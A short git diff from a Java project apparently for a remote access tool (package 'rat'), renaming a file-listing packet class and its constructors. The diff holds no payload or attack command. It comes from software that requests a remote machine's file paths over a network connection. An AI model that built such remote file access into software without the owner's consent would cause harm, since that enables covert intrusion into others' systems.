@@ -6,7 +6,7 @@ import java.util.stream.Stream;
 
 import de.sogomn.rat.ActiveConnection;
 
-public class FileSystemPacket extends AbstractPingPongPacket {
+public class FileRequestPacket extends AbstractPingPongPacket {
 	
 	private String rootFile;
 	
@@ -15,14 +15,14 @@ public class FileSystemPacket extends AbstractPingPongPacket {
 	private static final byte INCOMING = 1;
 	private static final byte END = 0;
 	
-	public FileSystemPacket(final String rootFile) {
+	public FileRequestPacket(final String rootFile) {
 		this.rootFile = rootFile;
 		
 		type = REQUEST;
 		paths = new String[0];
 	}
 	
-	public FileSystemPacket() {
+	public FileRequestPacket() {
 		this("");
 		
 		type = DATA;
